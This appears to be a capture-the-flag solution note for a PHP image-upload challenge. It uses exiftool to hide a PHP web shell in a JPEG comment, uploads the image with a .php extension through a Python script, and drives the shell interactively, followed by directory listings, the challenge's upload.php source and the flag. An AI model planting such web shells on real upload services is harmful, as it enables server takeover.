---
created: 2025-03-01T20:37
updated: 2025-03-02T10:00
---

Simple PHP shell exploit.

```bash
exiftool -Comment="<?php system($_GET['cmd']); ?>" download.jpeg
```

```python
import re
import requests
import io
url = 'http://localhost:23363'
file_path = 'file.png.php'
with open('download.jpeg', 'rb') as f:
    file_bytes = f.read()
    file_bytes = io.BytesIO(file_bytes)
files = {'file': (file_path, file_bytes)}
response = requests.post(url+'/upload.php', files=files)
text = response.text
path = re.search(r'a href="(.+?)"', text).group(1)
while True:
    print(requests.get(url+'/'+path, params={
        'cmd': input("> ")}).text)
```

```bash
ls -la ..
drwxrwxrwx 1 www-data www-data 4096 Mar  2 14:55 .
drwxr-xr-x 1 www-data www-data 4096 Mar  2 14:22 ..
drwxr-xr-x 2 www-data www-data 4096 Mar  2 14:48 04ea03036f7dad2eb1f75a978ff91e89
drwxr-xr-x 2 www-data www-data 4096 Mar  2 14:53 177fdfd93217e8fbed1106ab910d8906
drwxr-xr-x 2 www-data www-data 4096 Mar  2 14:46 1b21b761f815d6339c12fa6b91a6f370
drwxr-xr-x 2 www-data www-data 4096 Mar  2 14:55 45c388f9008d977749a6ef4773cb122c
ls -la ../..
drwxr-xr-x 1 www-data www-data 4096 Mar  2 14:22 .
drwxr-xr-x 1 www-data www-data 4096 Mar  2 14:22 .
drwxr-xr-x 1 root     root     4096 Feb 25 02:22 ..
drwxr-xr-x 1 root     root     4096 Feb 25 02:22 ..
-rwxr-xr-x 1 www-data www-data   18 Mar  2 14:21 .htaccess
-rwxr-xr-x 1 www-data www-data 2165 Mar  2 14:21 index.html
-rwxr-xr-x 1 www-data www-data   63 Mar  2 14:21 php.ini
-rwxr-xr-x 1 www-data www-data 1836 Mar  2 14:21 upload.php
drwxrwxrwx 1 www-data www-data 4096 Mar  2 14:55 uploads
cat ../../upload.php
```

```php
<?php
session_start();
$flag = 'ATHACKCTF{f4ke_it_till_y0u_m4ke_it}';

if (isset($_FILES['file'])) {
    $allowed_types = [IMAGETYPE_JPEG, IMAGETYPE_PNG, IMAGETYPE_GIF, IMAGETYPE_WEBP];
    $file_type = exif_imagetype($_FILES['file']['tmp_name']);

    $name = $_FILES['file']['name'];
    $extension = pathinfo($name, PATHINFO_EXTENSION);

    if (!in_array($file_type, $allowed_types)) {
        // Check if file was renamed to look like an image
        if (in_array(strtolower($extension), ['jpg', 'jpeg', 'png', 'gif', 'webp'])) {
            echo "<div class='flag-message'><h1>Congratulations! You've found the flag: $flag</h1></div>";
            exit;
        } else {
            die("Only image files (JPEG, PNG, GIF, WEBP) are allowed.");
        }
    }

    if ($_FILES['file']['size'] < 52428800) { // Check file size...  smaller files??
        if (isset($_SESSION['id'])) {
            $random = $_SESSION['id'];
        } else {
            $random = bin2hex(random_bytes(16));
            $_SESSION['id'] = $random;
        }

        $dir = 'uploads/' . $random;
        if (!is_dir($dir)) {
            mkdir($dir, 0777, true);

        $path = $dir . '/' . basename($name);

        if (move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
            echo '<!DOCTYPE html><html>
<head>
<link rel="stylesheet" href="static/bootstrap.css">
<link rel="stylesheet" href="static/stylesheet.css">
</head>
<body>
<div class="align-middle well">
<div class="container my-5 px-4">
    <p>File has been uploaded successfully... You can find it <a href="' . $path . '">here</a>, however You will <b>NOT</b> get the flag that easy!</p>
</div>
</div>
</body>
</html> ';
        }
    } else {
        die("File too large, this service is meant for small files only");
    }
} else {
    echo "No file sent";
}
```

```flag
ATHACKCTF{f4ke_it_till_y0u_m4ke_it}
```